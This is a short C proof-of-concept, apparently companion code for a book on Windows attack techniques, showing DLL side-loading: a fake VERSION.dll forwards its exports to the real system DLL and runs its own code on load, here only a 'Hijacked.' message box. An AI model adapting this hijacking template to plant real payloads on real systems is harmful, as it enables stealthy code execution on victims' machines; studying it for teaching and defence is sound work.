/**
 * DLL Side-Loading PoC (VERSION.dll)
 * Windows APT Warfare
 * by aaaddress1@chroot.org
 */
#include <Windows.h>

#pragma comment (linker, "/export:VerQueryValueW=" \
    "c:\\windows\\system32\\version.VerQueryValueW,@15")

#pragma comment(linker, "/export:GetFileVersionInfoW=" \
    "c:\\windows\\system32\\version.GetFileVersionInfoW,@7")

#pragma comment (linker, "/export:GetFileVersionInfoSizeW=" \
    "c:\\windows\\system32\\version.GetFileVersionInfoSizeW,@6")

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
        MessageBoxA(0, "Hijacked.", "30cm.tw", 0);
    return TRUE;
}


